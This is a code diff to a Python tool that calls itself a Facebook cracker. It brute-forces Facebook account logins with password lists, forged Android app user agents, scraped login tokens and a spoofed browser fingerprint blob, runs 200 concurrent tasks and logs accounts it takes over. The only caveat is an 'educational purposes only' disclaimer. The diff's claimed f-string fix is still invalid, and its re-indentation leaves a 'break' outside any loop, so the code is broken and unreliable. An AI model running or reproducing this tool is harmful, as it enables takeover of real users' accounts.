@@ -156,7 +156,8 @@ async def generate_user_agent() -> str:
     deevice = random.choice(["2312DRAABG", "2201117TG", "M2101K6G", "Redmi Note 14", "2404ARN45A", "22111317I", 
                            "23053RN02A", "M2101K7AI", "22101316C", "23129RAA4G"])
     
-    return f"[FBAN/FB4A;FBAV/{facebook_version};FBPN/com.facebook.katana;FBLC/bn_IN;FBBV/{bv};FBCR/Jio;FBMF/redmi;FBBD/redmi;FBDV/{deevice};FBSV/{versi_android};FBCA/arm64-v8a:null;FBDM/{density=2.0,width=1080,height=2400};FB_FW/1"
+    # Fixed the f-string syntax error
+    return f"[FBAN/FB4A;FBAV/{facebook_version};FBPN/com.facebook.katana;FBLC/bn_IN;FBBV/{bv};FBCR/Jio;FBMF/redmi;FBBD/redmi;FBDV/{deevice};FBSV/{versi_android};FBCA/arm64-v8a:null;FBDM/{density=2.0,width=1080,height=2400};FB_FW/1".format(density=2.0, width=1080, height=2400)
 
 async def extract_login_tokens(session: ClientSession, user_agent: str) -> Tuple[Optional[str], Optional[str]]:
     """Extract lsd and jazoest tokens from login page"""
@@ -248,7 +249,7 @@ async def async_crack(uid: str, password_list: List[str], total_count: int, sess
                     'jazoest': jazoest,
                     'lgndim': 'eyJ3IjoxNDQwLCJoIjo5MDAsImF3IjoxNDQwLCJhaCI6ODYwLCJjIjoyNH0=',
                     'ab_test_data': 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AZMZAAAAAFAA',
-                    'shared_prefs_data': 'eyIzMDAwMCI6W3sidCI6MTc2NTkyMjg3Ni4xODcsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpeV9tdXRhdGlvbl90b2tlbj1leUowZVhCbElqb3dMQ0pqY21WaGRHbHZibDkwYVcxbElqb3hOelkxT1RJeU9EVXdMQ0pqWVd4c2MybDBaVjlwWkNJNk16Z3hNakk1TURjNU5UYzFPVFEyZlElM0QlM0QmbmV4dCJ9LCJ2IjpmYWxzZX1dLCIzMDAwMSI6W3sidCI6MTc2NTkyMjg3Ni4xODcsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpeV9tdXRhdGlvbl90b2tlbj1leUowZVhCbElqb3dMQ0pqY21WaGRHbHZibDkwYVcxbElqb3hOelkxT1RJeU9EVXdMQ0pqWVd4c2MybDBaVjlwWkNJNk16Z3hNakk1TURjNU5UYzFPVFEyZlElM0QlM0QmbmV4dCJ9LCJ2Ijo1fV0sIjMwMDAyIjpbeyJ0IjoxNzY1OTIyODc2LjE4OCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2l5X211dGF0aW9uX3Rva2VuPWV5SjBlWEJsSWpvd0xDSmpjbVZoZEdsdmJsOTBhVzFsSWpveE56WTFPVEl5T0RVd0xDSmpZV3hzYzJsMFpWOXBaQ0k2TXpneE1qSTVNRGM1TlRjMU9UUTJmUSUzRCUzRCZuZXh0In0sInYiOjJ9XSwiMzAwMDMiOlt7InQiOjE3NjU5MjI4NzYuMTg4LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naXlfbXV0YXRpb25fdG9rZW49ZXlKMGVYQmxJam93TENKamNtVmhkR2x2Ymw5MGFXMWxJam94TnpZMU9USXlPRFV3TENKallXeHNjMmwwWlY5cFpDSTZNemd4TWpJNU1EYzVOVGMxT1RRMmZRJTNEJTNEJm5leHQifSwidiI6WyJlbi1JTiIsImVuLVVTIiwiZW4tR0IiLCJlbiIsImhpIiwiZ3UiLCJibiJdfV0sIjMwMDA0IjpbeyJ0IjoxNzY1OTIyODc2LjE4OCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2cuY29tL2xvZ2l5X211dGF0aW9uX3Rva2VuPWV5SjBlWEJsSWpvd0xDSmpjbVZoZEdsdmJsOTBhVzFsSWpveE56WTFPVEl5T0RVd0xDSmpZV3hzYzJsMFpWOXBaQ0k2TXpneE1qSTVNRGM1TlRjMU9UUTJmUSUzRCUzRCZuZXh0In0sInYiOjE1MH1dLCIzMDAwNSI6W3sidCI6MTc2NTkyMjg3Ni4xODgsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpeV9tdXRhdGlvbl90b2tlbj1leUowZVhCbElqb3dMQ0pqY21WaGRHbHZibDkwYVcxbElqb3hOelkxT1RJeU9EVXdMQ0pqWVd4c2MybDBaVjlwWkNJNk16Z3hNakk1TURjNU5UYzFPVFEyZlElM0QlM0QmbmV4dCJ9LCJ2Ijp7InciOjExMDUsImgiOjc3M319XSwiMzAwMDciOlt7InQiOjE3NjU5MjI4NzYuMTg4LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naXlfbXV0YXRpb25fdG9rZW49ZXlKMGVYQmxJam93TENKamNtVmhkR2x2Ymw5MGFXMWxJam94TnpZMU9USXlPRFV3TENKallXeHNjMmwwWlY5cFpDSTZNemd4TWpJNU1EYzVOVGMxT1RRMmZRJTNEJTNEJm5leHQifSwidiI6ImRlZmF1bHQifV0sIjMwMDA4IjpbeyJ0IjoxNzY1OTIyODc2LjIzOSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2l5X211dGF0aW9uX3Rva2VuPWV5SjBlWEJsSWpvd0xDSmpjbVZoZEdsdmJsOTBhVzFsSWpveE56WTFPVEl5T0RVd0xDSmpZV3hzYzJsMFpWOXBaQ0k2TXpneE1qSTVNRGM1TlRjMU9UUTJmUSUzRCUzRCZuZXh0In0sInYiOiJwcm9tcHQifV0sIjMwMDEyIjpbeyJ0IjoxNzY1OTIyODc2LjE5LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naXlfbXV0YXRpb25fdG9rZW49ZXlKMGVYQmxJam93TENKamNtVmhkR2x2Ymw5MGFXMWxJam94TnpZMU9USXlPRFV3TENKallXeHNjMmwwWlY5cFpDSTZNemd4TWpJNU1EYzVOVGMxT1RRMmZRJTNEJTNEJm5leHQifSwidiI6Ikdvb2dsZSBJbmMuIn1dLCIzMDAxMyI6W3sidCI6MTc2NTkyMjg3Ni4xOSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2l5X211dGF0aW9uX3Rvb2VuPWV5SjBlWEJsSWpvd0xDSmpjbVZoZEdsdmJsOTBhVzFsSWpveE56WTFPVEl5T0RVd0xDSmpZV3hzYzJsMFpWOXBaQ0k2TXpneE1qSTVNRGM1TlRjMU9UUTJmUSUzRCUzRCZuZXh0In0sInYiOiI1LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzE0My4wLjAuMCBTYWZhcmkvNTM3LjM2In1dLCIzMDAxNSI6W3sidCI6MTc2NTkyMjg3Ni4xOSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2l5X211dGF0aW9uX3Rva2VuPWV5SjBlWEJsSWpvd0xDSmpjbVZoZEdsdmJsOTBhVzFsSWpveE56WTFPVEl5T0RVd0xDSmpZV3hzYzJsMFpWOXBaQ0k2TXpneE1qSTVNRGM1TlRjMU9UUTJmUSUzRCUzRCZuZXh0In0sInYiOiJXaW4zMiJ9XSwiMzAwMTgiOlt7InQiOjE3NjU5MjI4NzYuMTksImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpeV9tdXRhdGlvbl90b2tlbj1leUowZVhCbElqb3dMQ0pqY21WaGRHbHZibDkwYVcxbElqb3hOelkxT1RJeU9EVXdMQ0pqWVd4c2MybDBaVjlwWkNJNk16Z3hNakk1TURjNU5UYzFPVFEyZlElM0QlM0QmbmV4dCJ9LCJ2IjoyfV0sIjMwMDIyIjpbeyJ0IjoxNzY1OTIyODc2LjIwNCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2l5X211dGF0aW9uX3Rva2VuPWV5SjBlWEJsSWpvd0xDSmpjbVZoZEdsdmJsOTBhVzFsSWpveE56WTFPVEl5T0RVd0xDSmpZV3hzYzJsMFpWOXBaQ0k2TXpneE1qSTVNRGM1TlRjMU9UUTJmUSUzRCUzRCZuZXh0In0sInYiOnRydWV9XSwiMzAwNDAiOlt7InQiOjE3NjU5MjI4NzYuMjA0LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naXlfbXV0YXRpb25fdG9rZW49ZXlKMGVYQmxJam93TENKamNtVmhkR2x2Ymw5MGFXMWxJam94TnpZMU9USXlPRFV3TENKallXeHNjMmwwWlY5cFpDSTZNemd4TWpJNU1EYzVOVGMxT1RRMmZRJTNEJTNEJm5leHQifSwidiI6LTMzMH1dLCIzMDA5MyI6W3sidCI6MTc2NTkyMjg3Ni4yMDUsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpeV9tdXRhdGlvbl90b2tlbj1leUowZVhCbElqb3dMQ0pqY21WaGRHbHZibDkwYVcxbElqb3hOelkxT1RJeU9EVXdMQ0pqWVd4c2MybDBaVjlwWkNJNk16Z3hNakk1TURjNU5UYzFPVFEyZlElM0QlM0QmbmV4dCJ9LCJ2IjowfV0sIjMwMDk0IjpbeyJ0IjoxNzY1OTIyODc2LjIwNSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2l5X211dGF0aW9uX3Rva2VuPWV5SjBlWEJsSWpvd0xDSmpjbVZoZEdsdmJsOTBhVzFsSWpveE56WTFPVEl5T0RVd0xDSmpZV3hzYzJsMFpWOXBaQ0k2TXpneE1qSTVNRGM1TlRjMU9UUTJmUSUzRCUzRCZuZXh0In0sInYiOiJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTQzLjAuMC4wIFNhZmFyaS81MzcuMzYifV0sIjMwMDk1IjpbeyJ0IjoxNzY1OTIyODc2LjIwNSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2l5X211dGF0aW9uX3Rva2VuPWV5SjBlWEJsSWpvd0xDSmpjbVZoZEdsdmJsOTBhVzFsSWpveE56WTFPVEl5T0RVd0xDSmpZV3hzYzJsMFpWOXBaQ0k2TXpneE1qJNU1EYzVOVGMxT1RRMmZRJTNEJTNEJm5leHQifSwidiI6NX1dLCIzMDEwNiI6W3sidCI6MTc2NTkyMjg3Ni4xODQsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpeV9tdXRhdGlvbl90b2tlbj1leUowZVhCbElqb3dMQ0pqY21WaGRHbHZibDkwYVcxbElqb3hOelkxT1RJeU9EVXdMQ0pqWVd4c2MybDBaVjlwWkNJNk16Z3hNakk1TURjNU5UYzFPVFEyZlElM0QlM0QmbmV4dCJ9LCJ2IjpmYWxzZX0seyJ0IjoxNzY1OTIyODc2LjIyOCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2l5X211dGF0aW9uX3Rva2VuPWV5SjBlWEJsSWpvd0xDSmpjbVZoZEdsdmJsOTBhVzFsSWpveE56WTFPVEl5T0RVd0xDSmpZV3hzYzJsMFpWOXBaQ0k2TXpneE1qSTVNRGM1TlRjMU9UUTJmUSUzRCUzRCZuZXh0In0sInYiOnRydWV9XSwiMzAxMDciOlt7InQiOjE3NjU5MjI4NzYuMTg1LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naXlfbXV0YXRpb25fdG9rZW49ZXlKMGVYQmxJam93TENKamNtVmhkR2x2Ymw5MGFXMWxJam94TnpZMU9USXlPRFV3TENKallXeHNjMmwwWlY5cFpDSTZNemd4TWpJNU1EYzVOVGMxT1RRMmZRJTNEJTNEJm5leHQifSwidiI6ZmFsc2V9XX0=',
+                    'shared_prefs_data': 'eyIzMDAwMCI6W3sidCI6MTc2NTkyMjg3Ni4xODcsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpeV9tdXRhdGlvbl90b2tlbj1leUowZVhCbElqb3dMQ0pqY21WaGRHbHZibDkwYVcxbElqb3hOelkxT1RJeU9EVXdMQ0pqWVd4c2MybDBaVjlwWkNJNk16Z3hNakk1TURjNU5UYzFPVFEyZlElM0QlM0QmbmV4dCJ9LCJ2IjpmYWxzZX1dLCIzMDAwMSI6W3sidCI6MTc2NTkyMjg3Ni4xODcsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpeV9tdXRhdGlvbl90b2tlbj1leUowZVhCbElqb3dMQ0pqY21WaGRHbHZibDkwYVcxbElqb3hOelkxT1RJeU9EVXdMQ0pqWVd4c2MybDBaVjlwWkNJNk16Z3hNakk1TURjNU5UYzFPVFEyZlElM0QlM0QmbmV4dCJ9LCJ2Ijo1fV0sIjMwMDAyIjpbeyJ0IjoxNzY1OTIyODc2LjE4OCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2l5X211dGF0aW9uX3Rva2VuPWV5SjBlWEJsSWpvd0xDSmpjbVZoZEdsdmJsOTBhVzFsSWpveE56WTFPVEl5T0RVd0xDSmpZV3hzYzJsMFpWOXBaQ0k2TXpneE1qSTVNRGM1TlRjMU9UUTJmUSUzRCUzRCZuZXh0In0sInYiOjJ9XSwiMzAwMDMiOlt7InQiOjE3NjU5MjI4NzYuMTg4LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naXlfbXV0YXRpb25fdG9rZW49ZXlKMGVYQmxJam93TENKamNtVmhkR2x2Ymw5MGFXMWxJam94TnpZMU9USXlPRFV3TENKallXeHNjMmwwWlY5cFpDSTZNemd4TWpJNU1EYzVOVGMxT1RRMmZRJTNEJTNEJm5leHQifSwidiI6WyJlbi1JTiIsImVuLVVTIiwiZW4tR0IiLCJlbiIsImhpIiwiZ3UiLCJibiJdfV0sIjMwMDA0IjpbeyJ0IjoxNzY1OTIyODc2LjE4OCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2l5X211dGF0aW9uX3Rva2VuPWV5SjBlWEJsSWpvd0xDSmpjbVZoZEdsdmJsOTBhVzFsSWpveE56WTFPVEl5T0RVd0xDSmpZV3hzYzJsMFpWOXBaQ0k2TXpneE1qSTVNRGM1TlRjMU9UUTJmUSUzRCUzRCZuZXh0In0sInYiOjE1MH1dLCIzMDAwNSI6W3sidCI6MTc2NTkyMjg3Ni4xODgsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpeV9tdXRhdGlvbl90b2tlbj1leUowZVhCbElqb3dMQ0pqY21WaGRHbHZibDkwYVcxbElqb3hOelkxT1RJeU9EVXdMQ0pqWVd4c2MybDBaVjlwWkNJNk16Z3hNakk1TURjNU5UYzFPVFEyZlElM0QlM0QmbmV4dCJ9LCJ2Ijp7InciOjExMDUsImgiOjc3M319XSwiMzAwMDciOlt7InQiOjE3NjU5MjI4NzYuMTg4LCJjdHgiOnsiY24iOiJodHRwczovL3d3LmZhY2Vib29rLmNvbS9sb2dpeV9tdXRhdGlvbl90b2tlbj1leUowZVhCbElqb3dMQ0pqY21WaGRHbHZibDkwYVcxbElqb3hOelkxT1RJeU9EVXdMQ0pqWVd4c2MybDBaVjlwWkNJNk16Z3hNakk1TURjNU5UYzFPVFEyZlElM0QlM0QmbmV4dCJ9LCJ2IjoiZGVmYXVsdCJ9XSwiMzAwMDgiOlt7InQiOjE3NjU5MjI4NzYuMjM5LCJjdHgiOnsiY24iOiJodHRwczovL3d3LmZhY2Vib29rLmNvbS9sb2dpeV9tdXRhdGlvbl90b2tlbj1leUowZVhCbElqb3dMQ0pqY21WaGRHbHZibDkwYVcxbElqb3hOelkxT1RJeU9EVXdMQ0pqWVd4c2MybDBaVjlwWkNJNk16Z3hNakk1TURjNU5UYzFPVFEyZlElM0QlM0QmbmV4dCJ9LCJ2IjoicHJvbXB0In1dLCIzMDAxMiI6W3sidCI6MTc2NTkyMjg3Ni4xOSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2l5X211dGF0aW9uX3Rva2VuPWV5SjBlWEJsSWpvd0xDSmpjbVZoZEdsdmJsOTBhVzFsSWpveE56WTFPVEl5T0RVd0xDSmpZV3hzYzJsMFpWOXBaQ0k2TXpneE1qSTVNRGM1TlRjMU9UUTJmUSUzRCUzRCZuZXh0In0sInYiOiJHb29nbGUgSW5jLiJ9XSwiMzAwMTMiOlt7InQiOjE3NjU5MjI4NzYuMTksImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpeV9tdXRhdGlvbl90b2tlbj1leUowZVhCbElqb3dMQ0pqY21WaGRHbHZibDkwYVcxbElqb3hOelkxT1RJeU9EVXdMQ0pqWVd4c2MybDBaVjlwWkNJNk16Z3hNakk1TURjNU5UYzFPVFEyZlElM0QlM0QmbmV4dCJ9LCJ2IjoiNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xNDMuMC4wLjAgU2FmYXJpLzUzNy4zNiJ9XSwiMzAwMTUiOlt7InQiOjE3NjU5MjI4NzYuMTksImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpeV9tdXRhdGlvbl90b2tlbj1leUowZVhCbElqb3dMQ0pqY21WaGRHbHZibDkwYVcxbElqb3hOelkxT1RJeU9EVXdMQ0pqWVd4c2MybDBaVjlwWkNJNk16Z3hNakk1TURjNU5UYzFPVFEyZlElM0QlM0QmbmV4dCJ9LCJ2IjoiV2luMzIifV0sIjMwMDE4IjpbeyJ0IjoxNzY1OTIyODc2LjE5LCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naXlfbXV0YXRpb25fdG9rZW49ZXlKMGVYQmxJam93TENKamNtVmhkR2x2Ymw5MGFXMWxJam94TnpZMU9USXlPRFV3TENKallXeHNjMmwwWlY5cFpDSTZNemd4TWpJNU1EYzVOVGMxT1RRMmZRJTNEJTNEJm5leHQifSwidiI6Mn1dLCIzMDAyMiI6W3sidCI6MTc2NTkyMjg3Ni4yMDQsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpeV9tdXRhdGlvbl90b2tlbj1leUowZVhCbElqb3dMQ0pqY21WaGRHbHZibDkwYVcxbElqb3hOelkxT1RJeU9EVXdMQ0pqWVd4c2MybDBaVjlwWkNJNk16Z3hNakk1TURjNU5UYzFPVFEyZlElM0QlM0QmbmV4dCJ9LCJ2Ijp0cnVlfV0sIjMwMDQwIjpbeyJ0IjoxNzY1OTIyODc2LjIwNCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2l5X211dGF0aW9uX3Rva2VuPWV5SjBlWEJsSWpvd0xDSmpjbVZoZEdsdmJsOTBhVzFsSWpveE56WTFPVEl5T0RVd0xDSmpZV3hzYzJsMFpWOXBaQ0k2TXpneE1qSTVNRGM1TlRjMU9UUTJmUSUzRCUzRCZuZXh0In0sInYiOi0zMzB9XSwiMzAwOTMiOlt7InQiOjE3NjU5MjI4NzYuMjA1LCJjdHgiOnsiY24iOiJodHRwczovL3d3LmZhY2Vib29rLmNvbS9sb2dpeV9tdXRhdGlvbl90b2tlbj1leUowZVhCbElqb3dMQ0pqY21WaGRHbHZibDkwYVcxbElqb3hOelkxT1RJeU9EVXdMQ0pqWVd4c2MybDBaVjlwWkNJNk16Z3hNakk1TURjNU5UYzFPVFEyZlElM0QlM0QmbmV4dCJ9LCJ2IjowfV0sIjMwMDk0IjpbeyJ0IjoxNzY1OTIyODc2LjIwNSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2l5X211dGF0aW9uX3Rva2VuPWV5SjBlWEJsSWpvd0xDSmpjbVZoZEdsdmJsOTBhVzFsSWpveE56WTFPVEl5T0RVd0xDSmpZV3hzYzJsMFpWOXBaQ0k2TXpneE1qSTVNRGM1TlRjMU9UUTJmUSUzRCUzRCZuZXh0In0sInYiOiJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTQzLjAuMC4wIFNhZmFyaS81MzcuMzYifV0sIjMwMDk1IjpbeyJ0IjoxNzY1OTIyODc2LjIwNSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2l5X211dGF0aW9uX3Rva2VuPWV5SjBlWEJsSWpvd0xDSmpjbVZoZEdsdmJsOTBhVzFsSWpveE56WTFPVEl5T0RVd0xDSmpZV3hzYzJsMFpWOXBaQ0k2TXpneE1qJNU1EYzVOVGMxT1RRMmZRJTNEJTNEJm5leHQifSwidiI6NX1dLCIzMDEwNiI6W3sidCI6MTc2NTkyMjg3Ni4xODQsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpeV9tdXRhdGlvbl90b2tlbj1leUowZVhCbElqb3dMQ0pqY21WaGRHbHZibDkwYVcxbElqb3hOelkxT1RJeU9EVXdMQ0pqWVd4c2MybDBaVjlwWkNJNk16Z3hNakk1TURjNU5UYzFPVFEyZlElM0QlM0QmbmV4dCJ9LCJ2IjpmYWxzZX0seyJ0IjoxNzY1OTIyODc2LjIyOCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2l5X211dGF0aW9uX3Rva2VuPWV5SjBlWEJsSWpvd0xDSmpjbVZoZEdsdmJsOTBhVzFsSWpveE56WTFPVEl5T0RVd0xDSmpZV3hzYzJsMFpWOXBaQ0k2TXpneE1qSTVNRGM1TlRjMU9UUTJmUSUzRCUzRCZuZXh0In0sInYiOnRydWV9XSwiMzAxMDciOlt7InQiOjE3NjU5MjI4NzYuMTg1LCJjdHgiOnsiY24iOiJodHRwczovL3d3LmZhY2Vib29rLmNvbS9sb2dpeV9tdXRhdGlvbl90b2tlbj1leUowZVhCbElqb3dMQ0pqY21WaGRHbHZibDkwYVcxbElqb3hOelkxT1RJeU9EVXdMQ0pqWVd4c2MybDBaVjlwWkNJNk16Z3hNakk1TURjNU5UYzFPVFEyZlElM0QlM0QmbmV4dCJ9LCJ2Ijp6YWxzZX1dfQ==',
                     'encpass': encpass,
                 }
                 
@@ -535,53 +536,53 @@ def menu():
         clear()
         print(f"\033[1;96m{'='*46}")
         print(f"\033[1;96m     🚀 FACEBOOK CRACKER v3.0 🚀")
+    print(f"\033[1;96m{'='*46}")
+    print(f" \033[1;97m[\033[1;92m1\033[1;97m] 🎯 Async Random Number Cloning (200 Tasks)")
+    print(f" \033[1;97m[\033[1;92m2\033[1;97m] 📊 View Statistics")
+    print(f" \033[1;97m[\033[1;92m3\033[1;97m] ⚡ Performance Test")
+    print(f" \033[1;97m[\033[1;92m4\033[1;97m] ❌ Exit Program")
+    print(f"\033[1;96m{'='*46}")
+    
+    choice = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Select Option: \033[1;92m").strip()
+    
+    if choice == '1':
+        random_number()
+    elif choice == '2':
+        clear()
         print(f"\033[1;96m{'='*46}")
-        print(f" \033[1;97m[\033[1;92m1\033[1;97m] 🎯 Async Random Number Cloning (200 Tasks)")
-        print(f" \033[1;97m[\033[1;92m2\033[1;97m] 📊 View Statistics")
-        print(f" \033[1;97m[\033[1;92m3\033[1;97m] ⚡ Performance Test")
-        print(f" \033[1;97m[\033[1;92m4\033[1;97m] ❌ Exit Program")
+        print(f"\033[1;96m     📊 PROGRAM STATISTICS 📊")
         print(f"\033[1;96m{'='*46}")
-        
-        choice = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Select Option: \033[1;92m").strip()
-        
-        if choice == '1':
-            random_number()
-        elif choice == '2':
-            clear()
-            print(f"\033[1;96m{'='*46}")
-            print(f"\033[1;96m     📊 PROGRAM STATISTICS 📊")
-            print(f"\033[1;96m{'='*46}")
-            print(f" \033[1;97m[✅] Total Successful: \033[1;92m{len(oks)}")
-            print(f" \033[1;97m[❌] Total Failed: \033[1;91m{len(cps)}")
-            print(f" \033[1;97m[📝] Generated IDs: \033[1;93m{len(idz)}")
-            print(f" \033[1;97m[🔄] Current Progress: \033[1;94m{loop_counter}")
-            print(f" \033[1;97m[⚡] Async Mode: \033[1;92mEnabled (200 tasks)")
-            linex()
-            input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter to continue...")
-        elif choice == '3':
-            clear()
-            print(f"\033[1;96m{'='*46}")
-            print(f"\033[1;96m     ⚡ PERFORMANCE TEST ⚡")
-            print(f"\033[1;96m{'='*46}")
-            print(f" \033[1;97mAsync HTTP Client: \033[1;92maiohttp")
-            print(f" \033[1;97mConcurrent Tasks: \033[1;92m200")
-            print(f" \033[1;97mConnection Limit: \033[1;92m200")
-            print(f" \033[1;97mTimeout: \033[1;92m30 seconds")
-            print(f" \033[1;91m[!] This tool is for educational purposes only!")
-            linex()
-            input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter to continue...")
-        elif choice == '4':
-            clear()
-            print(f"\033[1;92m{'='*46}")
-            print(f" \033[1;92m     👋 GOODBYE! THANKS FOR USING OUR TOOL! 👋")
-            print(f"\033[1;92m{'='*46}")
-            print(f" \033[1;93m[!] Results saved in: SUMON_RANDOM_IDS.txt")
-            print(f" \033[1;93m[!] Total successful accounts: {len(oks)}")
-            time.sleep(3)
-            break
-        else:
-            print(f" \033[1;91m[!] Invalid option! Please choose 1-4.")
-            time.sleep(2)
+        print(f" \033[1;97m[✅] Total Successful: \033[1;92m{len(oks)}")
+        print(f" \033[1;97m[❌] Total Failed: \033[1;91m{len(cps)}")
+        print(f" \033[1;97m[📝] Generated IDs: \033[1;93m{len(idz)}")
+        print(f" \033[1;97m[🔄] Current Progress: \033[1;94m{loop_counter}")
+        print(f" \033[1;97m[⚡] Async Mode: \033[1;92mEnabled (200 tasks)")
+        linex()
+        input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter to continue...")
+    elif choice == '3':
+        clear()
+        print(f"\033[1;96m{'='*46}")
+        print(f"\033[1;96m     ⚡ PERFORMANCE TEST ⚡")
+        print(f"\033[1;96m{'='*46}")
+        print(f" \033[1;97mAsync HTTP Client: \033[1;92maiohttp")
+        print(f" \033[1;97mConcurrent Tasks: \033[1;92m200")
+        print(f" \033[1;97mConnection Limit: \033[1;92m200")
+        print(f" \033[1;97mTimeout: \033[1;92m30 seconds")
+        print(f" \033[1;91m[!] This tool is for educational purposes only!")
+        linex()
+        input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter to continue...")
+    elif choice == '4':
+        clear()
+        print(f"\033[1;92m{'='*46}")
+        print(f" \033[1;92m     👋 GOODBYE! THANKS FOR USING OUR TOOL! 👋")
+        print(f"\033[1;92m{'='*46}")
+        print(f" \033[1;93m[!] Results saved in: SUMON_RANDOM_IDS.txt")
+        print(f" \033[1;93m[!] Total successful accounts: {len(oks)}")
+        time.sleep(3)
+        break
+    else:
+        print(f" \033[1;91m[!] Invalid option! Please choose 1-4.")
+        time.sleep(2)
 
 if __name__ == "__main__":
     try:
